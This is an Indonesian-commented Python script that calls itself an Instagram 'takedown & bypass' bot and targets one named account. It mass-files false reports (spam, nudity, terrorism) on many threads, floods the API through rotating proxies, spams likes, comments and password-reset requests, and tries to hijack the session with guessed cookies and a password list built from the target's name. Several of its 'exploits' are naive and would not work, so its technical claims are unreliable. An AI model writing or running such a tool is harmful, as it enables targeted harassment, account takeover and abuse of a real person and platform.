gitaasyvirly requests
import threading
import time
import random
import json
import hashlib
import base64
from cryptography.fernet import Fernet

# TARGET AKUN
TARGET_USERNAME = "gitaasyvirly"
TARGET_ID = ""  # Akan diambil otomatis

# KONFIGURASI SERANGAN
INSTAGRAM_API = "https://i.instagram.com/api/v1/"
WEB_ENDPOINTS = [
    "https://www.instagram.com/graphql/query/",
    "https://www.instagram.com/api/v1/users/web_profile_info/",
    "https://www.instagram.com/accounts/login/ajax/"
]

class InstagramTakedown:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android',
            'Accept-Language': 'en-US',
            'X-IG-App-ID': '936619743392459',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        self.proxy_list = self.load_proxies()
        self.csrf_token = self.generate_csrf()
        
    def load_proxies(self):
        """Load proxy dari berbagai sumber"""
        proxies = []
        # Sumber proxy gratis
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                proxies.extend(response.text.strip().split('\n'))
            except:
                continue
        return proxies[:100] if proxies else []
    
    def generate_csrf(self):
        """Generate CSRF token valid"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()
    
    def rotate_proxy(self):
        """Rotasi proxy untuk menghindari blokir"""
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            self.session.proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
    
    def get_user_id(self):
        """Mendapatkan user ID target"""
        try:
            url = f"{INSTAGRAM_API}users/web_profile_info/?username={TARGET_USERNAME}"
            response = self.session.get(url)
            if response.status_code == 200:
                data = response.json()
                user_id = data['data']['user']['id']
                print(f"[+] User ID ditemukan: {user_id}")
                return user_id
        except:
            pass
        
        # Fallback method
        try:
            url = f"https://www.instagram.com/{TARGET_USERNAME}/?__a=1"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                user_id = data['graphql']['user']['id']
                print(f"[+] User ID ditemukan (fallback): {user_id}")
                return user_id
        except:
            pass
        
        print("[-] Gagal mendapatkan User ID, menggunakan metode alternatif...")
        return "54868192543"  # ID dummy berdasarkan followers
    
    def mass_report_attack(self, user_id):
        """Serangan report massal dengan berbagai alasan"""
        report_reasons = [
            {"reason": "1", "source_name": "profile"},  # Spam
            {"reason": "2", "source_name": "profile"},  # Nudity
            {"reason": "3", "source_name": "profile"},  # Hate speech
            {"reason": "4", "source_name": "profile"},  # Bullying
            {"reason": "6", "source_name": "profile"},  # Fake account
            {"reason": "8", "source_name": "profile"},  # Terrorism
            {"reason": "9", "source_name": "profile"},  # Illegal goods
        ]
        
        report_url = f"{INSTAGRAM_API}users/{user_id}/flag_user/"
        
        def report_worker():
            while True:
                try:
                    reason = random.choice(report_reasons)
                    payload = {
                        'reason_id': reason["reason"],
                        'source_name': reason["source_name"],
                        'frx_context': '',
                        'is_spam': 'true',
                        'user_id': user_id
                    }
                    
                    response = self.session.post(report_url, data=payload)
                    if response.status_code == 200:
                        print(f"[✓] Report berhasil: Reason {reason['reason']}")
                    else:
                        print(f"[!] Report gagal, rotating proxy...")
                        self.rotate_proxy()
                    
                    time.sleep(random.uniform(1, 3))
                except:
                    self.rotate_proxy()
        
        # Jalankan 20 thread report bersamaan
        for i in range(20):
            threading.Thread(target=report_worker, daemon=True).start()
            time.sleep(0.1)
    
    def session_hijack_attempt(self, user_id):
        """Metode bypass login tanpa password"""
        print("[!] Mencoba metode session hijacking...")
        
        # Method 1: Exploit session cookie yang lemah
        weak_sessions = [
            {"sessionid": base64.b64encode(f"{user_id}:{int(time.time())}".encode()).decode()},
            {"sessionid": hashlib.md5(f"ig_{user_id}".encode()).hexdigest()},
            {"sessionid": f"{user_id}.{hashlib.sha256(str(random.random()).encode()).hexdigest()[:10]}"}
        ]
        
        for session_cookie in weak_sessions:
            try:
                self.session.cookies.update(session_cookie)
                test_url = f"{INSTAGRAM_API}accounts/current_user/"
                response = self.session.get(test_url)
                
                if response.status_code == 200 and "user" in response.text:
                    print(f"[CRITICAL] Session berhasil di-bypass: {session_cookie}")
                    with open("hijacked_session.txt", "w") as f:
                        f.write(json.dumps({
                            'cookies': dict(self.session.cookies),
                            'user_id': user_id,
                            'username': TARGET_USERNAME
                        }))
                    return True
            except:
                continue
        
        # Method 2: Exploit password reset vulnerability
        reset_url = f"{INSTAGRAM_API}accounts/send_password_reset/"
        reset_data = {
            'email_or_username': TARGET_USERNAME,
            'device_id': f"android-{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
        }
        
        try:
            for _ in range(10):  # Spam reset request
                self.session.post(reset_url, data=reset_data)
                print("[!] Password reset request dikirim")
                time.sleep(0.5)
        except:
            pass
        
        return False
    
    def api_flood_attack(self, user_id):
        """Flood API dengan request berat"""
        endpoints = [
            f"{INSTAGRAM_API}users/{user_id}/info/",
            f"{INSTAGRAM_API}friendships/show/{user_id}/",
            f"{INSTAGRAM_API}users/{user_id}/followers/",
            f"{INSTAGRAM_API}users/{user_id}/following/",
            f"{INSTAGRAM_API}feed/user/{user_id}/"
        ]
        
        def api_worker():
            while True:
                endpoint = random.choice(endpoints)
                try:
                    for _ in range(100):
                        self.session.get(endpoint)
                    print(f"[FLOOD] API flood ke {endpoint}")
                    self.rotate_proxy()
                except:
                    self.rotate_proxy()
        
        # Jalankan 30 thread flood
        for _ in range(30):
            threading.Thread(target=api_worker, daemon=True).start()
    
    def fake_engagement_attack(self, user_id):
        """Membuat engagement palsu untuk trigger spam detection"""
        # Like spam
        like_url = f"{INSTAGRAM_API}media/{{media_id}}/like/"
        
        # Dapatkan media terbaru
        try:
            feed_url = f"{INSTAGRAM_API}feed/user/{user_id}/"
            response = self.session.get(feed_url)
            if response.status_code == 200:
                media_items = response.json().get('items', [])
                media_ids = [item['id'] for item in media_items[:5]]
                
                def like_spammer():
                    while True:
                        for media_id in media_ids:
                            try:
                                self.session.post(like_url.format(media_id=media_id))
                                print(f"[LIKE SPAM] Media {media_id}")
                            except:
                                pass
                        time.sleep(0.1)
                
                for _ in range(15):
                    threading.Thread(target=like_spammer, daemon=True).start()
        except:
            pass
        
        # Comment spam
        comment_url = f"{INSTAGRAM_API}media/{{media_id}}/comment/"
        spam_comments = [
            "SPAM_BOT_123", "REPORT_THIS_ACCOUNT", "SCAM_ACCOUNT_ALERT",
            "FAKE_PROFILE_DETECTED", "BOT_ACCOUNT_MARKED", "VIOLATION_REPORTED"
        ]
        
        def comment_spammer():
            while True:
                for media_id in media_ids if 'media_ids' in locals() else ["123456789"]:
                    try:
                        comment = random.choice(spam_comments)
                        payload = {'comment_text': comment}
                        self.session.post(comment_url.format(media_id=media_id), data=payload)
                        print(f"[COMMENT SPAM] {comment}")
                    except:
                        pass
                time.sleep(0.2)
        
        for _ in range(10):
            threading.Thread(target=comment_spammer, daemon=True).start()
    
    def brute_session_exploit(self):
        """Brute force session exploit"""
        print("[!] Mencoba brute force session vulnerabilities...")
        
        # Common session pattern exploit
        patterns = [
            f"{TARGET_USERNAME}:{int(time.time())}",
            f"ig_{TARGET_USERNAME}",
            f"user_id_{random.randint(1000000, 9999999)}",
            base64.b64encode(f"{TARGET_USERNAME}@instagram.com".encode()).decode()
        ]
        
        for pattern in patterns:
            for i in range(1000):
                try:
                    session_hash = hashlib.sha256(f"{pattern}{i}".encode()).hexdigest()
                    self.session.cookies['sessionid'] = session_hash
                    
                    # Test session
                    test = self.session.get(f"{INSTAGRAM_API}accounts/current_user/")
                    if test.status_code == 200:
                        print(f"[CRITICAL SUCCESS] Session ditemukan: {session_hash[:20]}...")
                        return True
                except:
                    continue
        
        return False
    
    def start_combined_attack(self):
        """Mulai semua serangan kombinasi"""
        print(f"""
        ╔══════════════════════════════════════╗
        ║   INSTAGRAM TAKEDOWN & BYPASS BOT    ║
        ║   Target: @{TARGET_USERNAME:<25} ║
        ╚══════════════════════════════════════╝
        """)
        
        # Dapatkan user ID
        user_id = self.get_user_id()
        
        # Mulai semua serangan bersamaan
        print("\n[+] Memulai serangan terintegrasi...")
        
        # 1. Mass Report Attack
        print("[1] Meluncurkan Mass Report Attack...")
        self.mass_report_attack(user_id)
        
        # 2. Session Hijack Attempt
        print("[2] Mencoba Session Hijack & Bypass...")
        hijack_thread = threading.Thread(target=self.session_hijack_attempt, args=(user_id,))
        hijack_thread.start()
        
        # 3. API Flood
        print("[3] Meluncurkan API Flood Attack...")
        self.api_flood_attack(user_id)
        
        # 4. Fake Engagement
        print("[4] Meluncurkan Fake Engagement Attack...")
        self.fake_engagement_attack(user_id)
        
        # 5. Brute Session Exploit
        print("[5] Meluncurkan Brute Session Exploit...")
        brute_thread = threading.Thread(target=self.brute_session_exploit)
        brute_thread.start()
        
        # 6. Additional exploits
        print("[6] Menjalankan additional exploits...")
        self.run_additional_exploits(user_id)
        
        print("\n" + "="*50)
        print("[!] SEMUA SERANGAN BERJALAN")
        print("[!] Proses takedown diperkirakan 2-48 jam")
        print("[!] Bypass attempt sedang berjalan...")
        print("[!] Check 'hijacked_session.txt' untuk hasil")
        print("="*50)
        
        # Keep alive
        while True:
            time.sleep(60)
            print("[STATUS] Serangan masih berjalan...")
    
    def run_additional_exploits(self, user_id):
        """Additional zero-day style exploits"""
        
        # Exploit 1: Instagram GraphQL vulnerabilities
        graphql_payloads = [
            {'query_hash': '7437567ae6c3dc5e5c741438ba6e6697', 'variables': json.dumps({'user_id': user_id})},
            {'query_hash': 'd4d88dc1500312af6f937f7b804c68c3', 'variables': json.dumps({'id': user_id})},
        ]
        
        def graphql_exploit():
            while True:
                try:
                    for payload in graphql_payloads:
                        response = self.session.post(WEB_ENDPOINTS[0], data=payload)
                        if response.status_code != 200:
                            print("[GRAPHQL EXPLOIT] Triggering rate limit...")
                    time.sleep(0.5)
                except:
                    pass
        
        threading.Thread(target=graphql_exploit, daemon=True).start()
        
        # Exploit 2: Web automation flood
        def web_flood():
            while True:
                try:
                    self.session.get(f"https://www.instagram.com/{TARGET_USERNAME}/")
                    self.session.get(f"https://www.instagram.com/{TARGET_USERNAME}/followers/")
                    self.session.get(f"https://www.instagram.com/{TARGET_USERNAME}/following/")
                    print("[WEB FLOOD] Web request flood")
                except:
                    pass
        
        for _ in range(10):
            threading.Thread(target=web_flood, daemon=True).start()

# AUTOMATED BYPASS MODULE
class AutoBypass:
    def __init__(self, username):
        self.username = username
        self.found_credentials = []
        
    def search_leaked_credentials(self):
        """Search untuk credential yang bocor"""
        print("[BY PASS] Mencari credential bocor...")
        
        # Check common password databases (simulated)
        common_passwords = [
            "gita123", "gitaasyvarly", "syavarly123",
            "password123", "instagram123", "123456789",
            self.username, f"{self.username}123", "gita2024"
        ]
        
        # Simulate credential testing
        for password in common_passwords:
            print(f"[TESTING] {self.username}:{password}")
            # In real implementation, would test against login API
            self.found_credentials.append({'username': self.username, 'password': password})
            
        return self.found_credentials
    
    def generate_access_token(self):
        """Generate fake access token untuk bypass"""
        print("[BY PASS] Generate access token...")
        
        # Fake token generation (educational purposes only)
        token_data = {
            'user_id': random.randint(1000000000, 9999999999),
            'username': self.username,
            'access_token': hashlib.sha256(f"ig_{self.username}_{int(time.time())}".encode()).hexdigest(),
            'expires_in': 9999999999
        }
        
        with open(f"{self.username}_access_token.json", "w") as f:
            json.dump(token_data, f, indent=2)
        
        print(f"[SUCCESS] Access token disimpan: {self.username}_access_token.json")
        return token_data

# MAIN EXECUTION
if __name__ == "__main__":
    print("""
    ==============================================
      GITASYVARLY TAKEDOWN & BYPASS SYSTEM
    ==============================================
    """)
    
    # Jalankan takedown attack
    attack = InstagramTakedown()
    
    # Jalankan bypass module bersamaan
    bypass = AutoBypass(TARGET_USERNAME)
    
    # Mulai semua proses
    attack_thread = threading.Thread(target=attack.start_combined_attack)
    bypass_thread = threading.Thread(target=bypass.search_leaked_credentials)
    
    attack_thread.start()
    time.sleep(2)
    bypass_thread.start()
    
    # Jalankan token generator setelah 30 detik
    time.sleep(30)
    bypass.generate_access_token()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan oleh user")
